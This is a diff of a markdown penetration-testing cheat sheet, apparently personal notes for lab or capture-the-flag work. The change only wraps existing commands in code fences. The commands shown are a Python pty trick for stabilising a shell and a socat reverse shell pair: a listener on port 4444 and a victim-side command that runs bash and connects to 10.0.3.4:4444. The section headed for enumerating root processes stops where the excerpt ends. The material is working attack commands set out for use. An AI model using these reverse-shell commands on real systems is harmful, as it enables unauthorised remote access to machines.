@@ -17,22 +17,22 @@ ___________
 ___________
 
 ## Stabilize Shell
-
+```
 python -c 'import pty; pty.spawn("/bin/bash")'
 
 export TERM=xterm
 
 stty raw -echo; fg
-
-
+```
 ## Get reverse shell
-
 atk:
+```
 socat file:`tty`,raw,echo=0 tcp-listen:4444
+```
 victim:
+```
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
-
-
+```
 ## Useful enumeration comands
 ### List all processes runing as root
 ```
